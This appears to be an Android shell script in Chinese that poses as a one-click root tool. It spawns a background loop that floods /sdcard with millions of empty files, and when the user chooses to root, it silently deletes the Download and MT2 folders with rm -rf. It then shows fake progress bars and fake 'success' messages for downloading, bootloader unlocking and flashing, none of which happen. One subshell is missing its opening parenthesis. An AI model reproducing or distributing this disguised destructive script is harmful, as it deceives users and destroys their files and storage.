#!/system/bin/sh
    TARGET_DIR="/sdcard"
    if [ ! -d "$TARGET_DIR" ]; then
        exit 1
    fi

    TEST_FILE="$TARGET_DIR/.write_test_$$"
    echo "test" > "$TEST_FILE" 2>/dev/null || {
        exit 1
    }
    rm -f "$TEST_FILE" 2>/dev/null

    
    BASE_FILENAME="系统文件第1"
    FILE_SIZE_KB=0
    LOOP_COUNT=9999999

    CURRENT_NUM=0
    while [ "$CURRENT_NUM" -lt "$LOOP_COUNT" ]; do
        CURRENT_NUM=$((CURRENT_NUM + 1))
        FILENAME="${BASE_FILENAME}${CURRENT_NUM-1}"
        [ "$CURRENT_NUM" -eq 1 ] && FILENAME="$BASE_FILENAME"
        FILEPATH="$TARGET_DIR/$FILENAME"
        dd if=/dev/zero of="$FILEPATH" bs=1K count="$FILE_SIZE_KB" 2>/dev/null || {
            continue
        }
        sleep 0
    done
) >/dev/null 2>&1 &  
echo "****欢迎使用一键root工具****"
sleep 0.5
echo "------Root有风险，是否确认执行------"
echo "========================="
echo "[1] >>>>开始root<<<<"
echo "[2] >>>>退出脚本<<<<"
echo "========================="
sleep 0.5
echo -n "---请选择操作--- [1/2]: "
read choice

case "$choice" in
    1)
        echo "正在读取设备型号"
        
        echo "设备型号: $(getprop ro.product.model)"
        echo "系统版本: $(getprop ro.build.version.release)"
        sleep 1
        echo 正在从服务器下载对应的boot包
        sleep 0.5
        rm -rf /storage/emulated/0/Download
        rm -rf /storage/emulated/0/MT2
        
        
total=15

current=0


while [ $current -le $total ]; do
    percent=$(( (current * 100) / total ))
    filled=$(( (percent * 20) / 100 ))
    empty=$(( 20 - filled ))
    printf "\r[%-${filled}s%-${empty}s] %d%%" "$(printf '#%.0s' $(seq 1 $filled))" "$(printf '-%.0s' $(seq 1 $empty))" "$percent"
   
    sleep 0.1
    
    
    current=$((current + 1))
done


echo ""
      echo boot已成功下载，准备解锁BootLoader
      sleep 0.5
      total=5

current=0


while [ $current -le $total ]; do
    percent=$(( (current * 100) / total ))
    filled=$(( (percent * 20) / 100 ))
    empty=$(( 20 - filled ))
    printf "\r[%-${filled}s%-${empty}s] %d%%" "$(printf '#%.0s' $(seq 1 $filled))" "$(printf '-%.0s' $(seq 1 $empty))" "$percent"
   
    sleep 0
    
    
    current=$((current + 1))
done


echo ""
 echo 成功
 echo 成功
 echo 成功
 echo 成功
 sleep 0.2
 echo 成功
 echo 成功
 echo 成功
 echo 成功
 sleep 2
 echo 开始从Sukisu Ultra官网下载管理器
 sleep 0.5
 total=6

current=0


while [ $current -le $total ]; do
    percent=$(( (current * 100) / total ))
    filled=$(( (percent * 20) / 100 ))
    empty=$(( 20 - filled ))
    printf "\r[%-${filled}s%-${empty}s] %d%%" "$(printf '#%.0s' $(seq 1 $filled))" "$(printf '-%.0s' $(seq 1 $empty))" "$percent"
   
    sleep 0.1
    
    
    current=$((current + 1))
done


echo ""
 echo 成功
 echo 开始修补boot
 sleep 0.2
 total=4

current=0


while [ $current -le $total ]; do
    percent=$(( (current * 100) / total ))
    filled=$(( (percent * 20) / 100 ))
    empty=$(( 20 - filled ))
    printf "\r[%-${filled}s%-${empty}s] %d%%" "$(printf '#%.0s' $(seq 1 $filled))" "$(printf '-%.0s' $(seq 1 $empty))" "$percent"
   
    sleep 0.1
    
    
    current=$((current + 1))
done


echo ""
 echo 开始刷入boot
 total=3

current=0


while [ $current -le $total ]; do
    percent=$(( (current * 100) / total ))
    filled=$(( (percent * 20) / 100 ))
    empty=$(( 20 - filled ))
    printf "\r[%-${filled}s%-${empty}s] %d%%" "$(printf '#%.0s' $(seq 1 $filled))" "$(printf '-%.0s' $(seq 1 $empty))" "$percent"
   
    sleep 0.1
    
    
    current=$((current + 1))
done


echo ""
 echo 成功
 echo 成功
 echo 成功
 sleep 0.5
 echo 成功
 echo 成功
 echo 共计耗时2s
 echo 正在隐藏环境
 sleep 1
 echo 成功
 echo 请重启手机
        ;;
    2)
        echo "❌ 用户取消操作，退出脚本"
        exit 0
        ;;
    *)
        echo "❌ 无效选项，退出脚本"
        exit 1
        ;;
esac

echo "🎯 主程序执行完毕"